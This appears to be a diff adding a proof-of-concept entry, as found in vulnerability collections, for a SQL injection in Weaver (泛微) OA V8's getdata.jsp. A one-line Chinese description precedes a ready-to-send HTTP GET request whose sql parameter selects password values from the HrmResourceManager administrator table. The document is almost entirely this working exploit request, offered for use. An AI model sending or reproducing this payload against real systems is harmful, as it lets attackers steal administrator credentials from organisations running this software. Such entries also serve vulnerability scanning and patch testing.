@@ -1,0 +1,9 @@
+# 泛微OA V8 getdata.jsp SQL注入漏洞
+# 泛微OA V8 getdata.jsp 存在SQL注入漏洞，攻击者通过此漏洞可以获取数据库敏感信息
+GET /js/hrm/getdata.jsp?acid=80025430&cmd=getSelectAllId&sql=select%2520password%2520as%2520id%2520from%2520HrmResourceManager&bid=hd_tag_m8mv25zr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25zr
+RM-PRO-Token: 396f07267468629f38cac5d4ad5d71a9
+RM-PRO-Time: 1742808517633
+User-Agent: curl/7.83.1
+
